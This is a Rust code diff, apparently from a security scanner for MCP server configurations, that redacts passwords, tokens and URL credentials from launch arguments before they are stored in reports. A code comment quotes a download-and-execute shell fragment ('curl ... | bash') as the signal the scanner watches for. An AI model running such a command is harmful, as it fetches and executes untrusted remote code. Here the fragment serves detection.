@@ -171,13 +171,86 @@ pub fn extract_mcp_server_details(json: &serde_json::Value) -> Vec<McpServerDeta
     details
 }
 
+/// Redact credential material from a launch argument before it is stored.
+///
+/// Args are needed for package identity and the download-and-execute check, but they
+/// routinely carry secrets: a connection string with userinfo
+/// (`postgres://user:pw@host/db`), or a `--token <value>` pair. Storing them verbatim
+/// put real passwords into the JSON and Blueprint output, which breaks the
+/// no-secret-leakage guarantee, so every arg is filtered on the way in.
+///
+/// `prev` is the preceding argument, so `--password secret` can be caught as well as
+/// `--password=secret`.
+pub fn redact_arg(arg: &str, prev: Option<&str>) -> String {
+    // A bare value whose FLAG was secret-looking: `--token`, `-p`, `--api-key`.
+    if let Some(prev) = prev
+        && !arg.starts_with('-')
+        && flag_names_a_secret(prev)
+    {
+        return "<redacted>".to_string();
+    }
+    // `--flag=value` where the flag is secret-looking.
+    if let Some((flag, value)) = arg.split_once('=')
+        && !value.is_empty()
+        && flag_names_a_secret(flag)
+    {
+        return format!("{flag}=<redacted>");
+    }
+    // Credentials embedded in a URL. Redact ONLY the userinfo, per whitespace token:
+    // an arg can be a whole shell fragment (`curl http://x/i.sh | bash`), and blanking
+    // the rest of it would destroy the download-and-execute signal we rely on. A URL
+    // with no userinfo carries no secret and is kept intact, because the scheme and
+    // host are themselves findings (plaintext transport, hostile gateway).
+    if arg.contains("://") {
+        return arg
+            .split(' ')
+            .map(|tok| match strip_url_userinfo(tok) {
+                Some(redacted) => redacted,
+                None => tok.to_string(),
+            })
+            .collect::<Vec<_>>()
+            .join(" ");
+    }
+    arg.to_string()
+}
+
+/// If `tok` is a URL carrying userinfo, return it with the userinfo replaced.
+/// Returns None when there is nothing secret to remove.
+fn strip_url_userinfo(tok: &str) -> Option<String> {
+    let scheme_end = tok.find("://")?;
+    let after = &tok[scheme_end + 3..];
+    // Userinfo ends at the last '@' BEFORE the path/query starts.
+    let authority_end = after.find(['/', '?', '#']).unwrap_or(after.len());
+    let at = after[..authority_end].rfind('@')?;
+    Some(format!(
+        "{}://<redacted>@{}",
+        &tok[..scheme_end],
+        &after[at + 1..]
+    ))
+}
+
+/// True if a CLI flag name suggests its value is a secret. Reuses the shared key-name
+/// heuristic, so `--api-key`, `--token`, `--password`, `--dsn` are all covered.
+fn flag_names_a_secret(flag: &str) -> bool {
+    let f = flag.trim_start_matches('-').replace('-', "_");
+    crate::scanners::env_files::is_secret_key_name(&f)
+        || matches!(f.to_ascii_lowercase().as_str(), "dsn" | "conn" | "connection" | "u" | "p" | "pw")
+}
+
 fn parse_server_detail(name: &str, cfg: &serde_json::Value) -> McpServerDetail {
     let command = cfg.get("command").and_then(|v| v.as_str()).map(|s| s.to_string());
-    let args: Vec<String> = cfg
+    // Raw args are used for package identity, then discarded: only the redacted form
+    // is stored, so a credential in a connection string never reaches the report.
+    let raw_args: Vec<String> = cfg
         .get("args")
         .and_then(|v| v.as_array())
         .map(|a| a.iter().filter_map(|v| v.as_str().map(|s| s.to_string())).collect())
         .unwrap_or_default();
+    let args: Vec<String> = raw_args
+        .iter()
+        .enumerate()
+        .map(|(i, a)| redact_arg(a, i.checked_sub(1).and_then(|j| raw_args.get(j)).map(String::as_str)))
+        .collect();
 
     // Determine transport type. Prefer an explicit "type"/"transport" field;
     // fall back to structural inference. The MCP spec replaced standalone SSE
@@ -205,7 +278,7 @@ fn parse_server_detail(name: &str, cfg: &serde_json::Value) -> McpServerDetail {
 
     // Extract package identity from command + args
     let (ecosystem, pkg_name, pkg_version) = if let Some(ref cmd) = command {
-        infer_package_from_command(cmd, &args)
+        infer_package_from_command(cmd, &raw_args)
     } else {
         (None, None, None)
     };
